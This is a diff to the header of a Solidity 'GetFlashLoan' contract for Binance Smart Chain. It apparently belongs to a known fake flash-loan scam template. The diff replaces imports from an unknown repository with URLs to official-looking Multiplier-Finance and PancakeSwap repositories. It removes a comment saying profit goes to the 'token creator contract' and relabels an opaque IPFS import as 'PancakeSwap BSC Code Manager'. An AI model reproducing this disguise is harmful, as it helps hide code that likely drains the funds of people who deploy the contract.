@@ -1,28 +1,15 @@
 pragma solidity ^0.5.0;
 
 // Multiplier-Finance Smart Contracts
-import "https://github.com/athcoin/flash/blob/main/ILendingPoolAddressesProvider.sol";
-import "https://github.com/athcoin/flash/blob/main/ILendingPool.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 
 // PancakeSwap Smart Contracts
-import "https://github.com/athcoin/flash/blob/main/IPancakeCallee.sol";
-import "https://github.com/athcoin/flash/blob/main/IPancakeFactory.sol";
-import "https://github.com/athcoin/flash/blob/main/IPancakePair.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
-/**
- * WARNING - this contract code is for Binance Smart Chain not Ethereum network
-
- * Testnet transactions will fail
-
- * New token will be created and flash loan will be pulled to trade against the token
-
- * Profit remaining will be transfered to token creator contract
-
- *UPDATED March 2022 - liquidity returned if flash loan fails
-
-*/
-
-// BSC Code Manager
+// PancakeSwap BSC Code Manager
 import "ipfs://QmRpB6X8nKzw2Ze2en7To2xZJ5mHRxztSPRwa9LdFtL5v1";
    
 contract GetFlashLoan {
